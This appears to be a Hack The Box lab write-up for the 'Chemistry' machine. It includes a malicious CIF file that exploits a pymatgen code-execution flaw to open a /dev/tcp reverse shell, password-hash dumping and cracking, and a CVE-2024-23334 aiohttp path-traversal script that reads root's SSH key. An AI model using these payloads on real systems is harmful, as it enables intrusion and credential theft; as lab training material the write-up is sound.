---
title: Chemistry - Hack The Box
date: 2024-10-24
---

# Chemistry

![Chemistry - info card](/ctf/hack-the-box/machines/chemistry/info-card.png)

## Enumeration

### Nmap

We start by running an Nmap scan to enumerate the open ports and services on the target:

```bash
nmap -A -T4 -p- 10.10.11.38
```

```bash
Nmap scan report for 10.10.11.38
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-title: Chemistry - Home
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the results, we identified two open ports:

- Port 22: SSH
- Port 5000: HTTP (running Werkzeug)

### Exploring HTTP - Port 5000

Upon visiting the website on port 5000, we see that it's a **Chemistry CIF Analyzer** that allows uploading and
analyzing **CIF** (Crystallographic Information File) files.

![Chemistry - Home](/ctf/hack-the-box/machines/chemistry/home-page.png)

After registering and logging in, we land on the dashboard, where users can upload CIF files for analysis.

![Chemistry - Dashboard](/ctf/hack-the-box/machines/chemistry/dashboard-page.png)

The website provides a sample CIF file:

```cif
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

### Vulnerability Research

Researching the web, we came across
a [vulnerability report](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f) related
to the **pymatgen** library used by the application. This vulnerability allows **arbitrary code** execution by
manipulating CIF files.

## Exploitation

### Reverse Shell Payload

We exploit the **pymatgen** vulnerability by crafting a CIF file that triggers a reverse shell.

Here’s the payload:

```cif
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/<ip>/4444 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```

::: info
Make sure to replace `<ip>` with your IP address and listen on port **4444** using `nc -lvnp 4444`.
:::

### Gaining Access

After uploading the payload, we receive a reverse shell. In the `instance` directory, we find a **sqlite database file**.

We can inspect the database with the following commands:

```bash
sqlite3 database.db
SELECT * FROM user;
```

This reveals a list of users and password hashes:

```bash
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
...
```

### User Flag

We find the user rosa in the /home directory. To access her account, we crack her password hash
using [CrackStation](https://crackstation.net/).

![CrackStation - Password Cracker](/ctf/hack-the-box/machines/chemistry/crackstation.png)

::: info
We can also use `hashcat` or `john` to crack the password hash.
:::

Once the password is cracked, we can log in via SSH:

```bash
ssh rosa@10.10.11.38
rosa@chemistry:~$ cat user.txt
[user-flag]
```

## Privilege Escalation

### Local Enumeration

Running `(netstat -punta || ss --ntpu)` reveals that **port 8080** is open locally.

```bash{2}
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
```

The root user is running a **monitoring_site** Python script:

```bash
/usr/bin/python3.9 /opt/monitoring_site/app.py
```

### Accessing the Internal Web Application

To view the web application running on port 8080, we use SSH port forwarding:

```bash
ssh -L 8080:127.0.0.1:8080 rosa@10.10.11.38
```

We then visit `http://localhost:8080` and use `whatweb` to identify the technology stack:

```plaintext
http://localhost:8080 [200 OK] HTML5, HTTPServer[Python/3.9 aiohttp/3.9.1], JQuery[3.6.0], Script, Title[Site Monitoring]
```

### Exploit (CVE-2024-23334)

We found that **aiohttp version 3.9.1** is vulnerable
to [CVE-2024-23334](https://github.com/z3rObyte/CVE-2024-23334-PoC), which allows directory traversal attacks. We can
use this exploit to access the root private key:

```bash
#!/bin/bash

url="http://localhost:8080"
payload="/assets/"
file="root/.ssh/id_rsa"

for ((i=0; i<15; i++)); do
    payload+="../"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"

    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

### Root flag

After retrieving the root private key, we log in as root:

```bash
ssh -i id_rsa root@10.10.11.38
root@chemistry:~# cat root.txt
[root-flag]
```

![Chemistry - pwned](/ctf/hack-the-box/machines/chemistry/pwned.png)

## References

- [GitHub - pymatgen vulnerability](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)
- [CrackStation](https://crackstation.net/)
- [HackTrick - Open ports](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports)
- [CVE-2024-23334](https://github.com/z3rObyte/CVE-2024-23334-PoC)